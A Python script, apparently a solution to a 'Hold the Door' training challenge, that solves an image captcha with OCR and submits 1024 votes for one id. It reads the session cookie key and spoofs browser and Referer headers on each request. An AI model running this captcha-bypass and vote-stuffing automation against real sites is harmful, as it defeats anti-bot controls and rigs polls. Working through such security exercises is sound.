#!/usr/bin/python3
import requests
import pytesseract
import PIL
from PIL import ImageFilter
import io
from lxml import html
import numpy
from scipy.ndimage.filters import gaussian_filter
import cv2
"""level5 module"""

url = "http://158.69.76.135/level5.php"

failed = 0
success = 0
total = 1024

session = requests.Session()

for i in range(total):
    res = session.get(url)

    image = session.get('http://158.69.76.135/tim.php')
    
    file = open("temp.png", "wb")
    file.write(image.content)
    file.close()


    def deobfuscate(img_file, limit=10):
        """change black pixels to background grey"""
        img = PIL.Image.open(img_file)
        img = img.convert('RGB')
        pixel_data = img.load()

        for x in range(img.size[0]):
            for y in range(img.size[1]):
                if (pixel_data[x, y][0] < limit) \
                        and (pixel_data[x, y][1] < limit) \
                        and (pixel_data[x, y][2] < limit):
                    pixel_data[x, y] = (128, 128, 128, 255)

        img.show()
        img.save('deobfuscated.png')
    
    deobfuscate('temp.png')
    # img = PIL.Image.open("deobfuscated.png")
    # bw = img.convert("L")
    # bw.save("bw.png")
    # threshold = bw.point(lambda p: p > 127 and 255)
    # threshold.save("threshold.png")
    # # blur = numpy.array(threshold)
    # # blurred = gaussian_filter(blur, sigma=1)
    # # blurred = PIL.Image.fromarray(blurred)
    # # blurred.save("blurred.png")
    # # final = blurred.point(lambda p: p > 140 and 255)
    # final = threshold.filter(PIL.ImageFilter.EDGE_ENHANCE_MORE)
    # final = final.filter(PIL.ImageFilter.SHARPEN)
    # final.save("final.png")

    

    custom = '-c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyz'
    captcha = pytesseract.image_to_string(PIL.Image.open('deobfuscated.png'), config=custom)

    dict = session.cookies.get_dict()
    headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                'Referer': url}
    data = {'id' : 2529,
            'key': dict['HoldTheDoor'],
            'captcha': captcha[0:8],
            'holdthedoor': 'Envoyer'}
    post = session.post(url, data=data, headers=headers)

    # print(post.request.headers)
    # print(post.text)
    # print(data)
    # print(captcha[0:8])

    print("Request #{:d} Key: {:s} Captcha: {:s}".format(i, dict['HoldTheDoor'], captcha[0:8]), end=' ')
    if post and "hacker" not in post.text:
        print("Request success")
        success += 1
    else:
        print("Request fail")
        failed += 1
    session.cookies.clear()

print("{:d} requests sent".format(total))
print("{:d} requests succeded".format(success))
print("{:d} requests failed".format(failed))



# post = session.post(url, data)